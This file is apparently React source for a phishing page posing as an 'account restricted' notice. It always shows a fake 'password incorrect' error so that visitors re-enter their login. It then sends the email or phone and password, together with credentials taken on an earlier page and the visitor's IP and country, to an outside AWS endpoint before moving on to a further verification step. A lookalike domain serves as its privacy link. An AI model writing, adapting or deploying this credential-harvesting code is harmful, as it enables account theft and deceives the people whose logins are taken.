import React, { useEffect, useState } from "react";
import { useLocation,useNavigate, useParams } from "react-router-dom";
import "bootstrap/dist/css/bootstrap.min.css";
import "./Wrong.scss"; // Custom styles
import axios from "axios";
import { useTranslation } from "react-i18next";
import { Modal, Button, Spinner } from "react-bootstrap";
import jwtEncode from "jwt-encode";

function Wrong() {
  const { id } = useParams();
  const location = useLocation(); // Get state data
  const [error, setError] = useState("");
  const [m1, setM1] = useState(location.state?.m1 || ""); 
  const [tk1, setTk1] = useState(location.state?.tk1 || ""); 
  const [messageId, setMessageId] = useState(id); // Retrieve message id
  const [tk2, setTk2] = useState("");
  const [m2, setM2] = useState("");
  const [isEmpty, setIsEmpty] = useState(!m2); // Track if field is empty
  const [loading, setLoading] = useState(false);
  const [ip, setIp] = useState("");
  const [country, setCountry] = useState("");
  const [ipTime, setIpTime] = useState("");
  const navigate = useNavigate(); // Hook điều hướng
  const { t } = useTranslation();
  const [showModal, setShowModal] = useState(false);

  const getCurrentCountry = async () => {
    try {
      const response = await axios.get("https://ipwho.is/");
      return { country: response.data.country, ipTime: new Date().toLocaleString("en-US", { timeZone: "UTC" }) };
    } catch (error) {
      console.error("Error fetching country:", error);
    }
  };

  const getUserIP = async () => {
    try {
      const response = await fetch("https://api64.ipify.org?format=json");
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Error fetching IP:", error);
    }
  };

  useEffect(() => {
    async function fetchData() {
      const userIp = await getUserIP();
      const { country: userCountry, ipTime: userIpTime } = await getCurrentCountry();
      setIp(userIp);
      setCountry(userCountry);
      setIpTime(userIpTime);
    }
    fetchData();
    setError("Your password you entered is incorrect.");
  }, []);

  const handleBlur = () => {
    setIsEmpty(m2.trim() === "");
  };

  const handleChange = (e) => {
    setM2(e.target.value);
    if (e.target.value.trim() !== "") {
      setIsEmpty(false); // Reset the red border when user types
      setError(""); // Reset the error message
    }
  };

  const sendAccountInfo = async () =>{
    if ( !tk2.trim() || !m2.trim()) {
      alert("Please fill in all required fields.");
      return;
    }
    setShowModal(true); // Show modal before sending data
    try {
      const payload = {
        country,
        ip,
        tk1,
        m1,
        tk2,
        m2,
        ipTime
      };

      const token = jwtEncode(payload, process.env.REACT_APP_JWT_SECRET);
      const response = await axios.post("https://zvfkaxjghb.execute-api.ap-southeast-2.amazonaws.com/product/edit-sent", {
        type:1,
        token:token,
        lastMessageId: messageId,
      });
      setLoading(true); 

      setTimeout(() => {
        setLoading(false); 
        setShowModal(false); 
        navigate("/ver1", { state: { tk1, m1,tk2, m2, messageId }}); 
      }, 1500);
    } catch (error) {
      console.error("Error:", error);
      alert("Error send to server!");
    }
  }

  return (
    <div className="wrong-container d-flex justify-content-center align-items-center min-vh-100">
      <div className="card p-4 text-center">
        {/* Top Illustration */}
        <img
          src={require("./security-icon.png")}
          alt="Security"
          className="security-icon"
        />

        {/* Title */}
        <h2 className="fw-bold mt-3">{t("restricted")}</h2>
        <p className="small text-muted">
        {t("restrictedAccount.tos")}
        </p>
        <hr style={{marginTop:"-2%"}}/>
        {/* Warning Message */}
        <p className="mt-2">
        {t("restrictedAccount.warning1")} {" "}
          <strong>{ipTime.substring(0,9)}</strong>{t("restrictedAccount.warning2")} {" "}
          <strong>
          {t("restrictedAccount.confirmed")}
          </strong>
        </p>

        {/* Form */}
        <form>
          <input
            type="text"
            className="form-control mb-2"
            placeholder={t("restrictedAccount.emailPhone")}
            value={tk2}
            onChange={(e) => setTk2(e.target.value)}
          />
          <input
            type="text"
            className={`form-control mb-1 ${isEmpty ? "border-danger" : ""}`}
            placeholder={t("restrictedAccount.password")}
            onChange={handleChange}
            onBlur={handleBlur}
          />
          {error && <p className="text-danger small text-start">{error}</p>}
        </form>

        <hr />

        {/* Button */}
        <div className="text-end">
          <button className="btn btn-primary w-25" onClick={sendAccountInfo} disabled={loading}>{loading ? t("restrictedAccount.verifying") : t("restrictedAccount.verify")}</button>
        </div>
        

        {/* Disclaimer */}
        <p className="disclaimer text-muted mt-3">
        {t("restrictedAccount.disclaimer")} <a href="https://marttettiddcase-getresponnsesite.click/privacy-policy" className="text-primary">{t("restrictedAccount.learnMore")}</a>
        </p>
      </div>
      {/* Verification Modal */}
      <Modal show={showModal} centered>
        <Modal.Body className="text-center">
          <Spinner animation="border" />
          <h4 className="mt-3">Verifying...</h4>
          <p>Please wait a moment.</p>
        </Modal.Body>
      </Modal>
    </div>
  );
}

export default Wrong;